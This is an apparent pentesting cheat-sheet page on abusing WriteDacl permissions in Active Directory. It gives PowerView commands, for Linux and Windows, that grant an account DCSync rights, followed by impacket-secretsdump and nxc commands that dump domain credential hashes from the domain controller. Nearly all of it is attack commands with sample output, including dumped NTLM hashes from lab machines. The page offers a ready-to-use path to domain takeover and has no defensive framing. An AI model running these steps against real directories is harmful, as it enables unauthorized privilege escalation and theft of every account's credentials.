---
title: "WriteDacl"
date: 2024-7-12
tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Directory", "Windows"]
---

### Abuse #1: Add dcsync right to user

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}powerview.py{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

#### 1. Connect to DC

```console
# With password
powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console
# With hash
powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H <HASH>
```

```console {class="sample-code"}
$ powerview 'CORP.LOCAL/WEB01$@172.16.1.5' -H 7ddf32e17a6ac5ce04a8ecbf782ca509
(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
PV > 
```

#### 2. Add dcsync right

```console
Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync
```

```console {class="sample-code"}
(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
PV > Add-DomainObjectAcl -PrincipalIdentity 'WEB01$' -TargetIdentity 'DC=corp,DC=local' -Rights DCSync
[2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local
[2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local
[2024-10-01 12:51:36] DACL modified successfully!
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add dcsync right

```console
Add-DomainObjectAcl -PrincipalIdentity '<USER>' -TargetIdentity '<TARGET_IDENTITY>' -Rights DCSync -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync -Credential $Cred
```

{{< /tabcontent >}}

#### Secrets dump

{{< tab set2 tab1 >}}impacket{{< /tab >}}
{{< tab set2 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump 'svc-alfresco:s3rvice@10.10.10.161'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[SNIP]...
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
```

```console {class="sample-code"}
$ nxc smb 172.16.1.5 -d CORP.LOCAL -u 'WEB01$' -H 7ddf32e17a6ac5ce04a8ecbf782ca509 --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
SMB         172.16.1.5      445    DC01             [+] CORP.LOCAL\WEB01$:7ddf32e17a6ac5ce04a8ecbf782ca509
SMB         172.16.1.5      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         172.16.1.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.1.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
...[SNIP]...
```

{{< /tabcontent >}}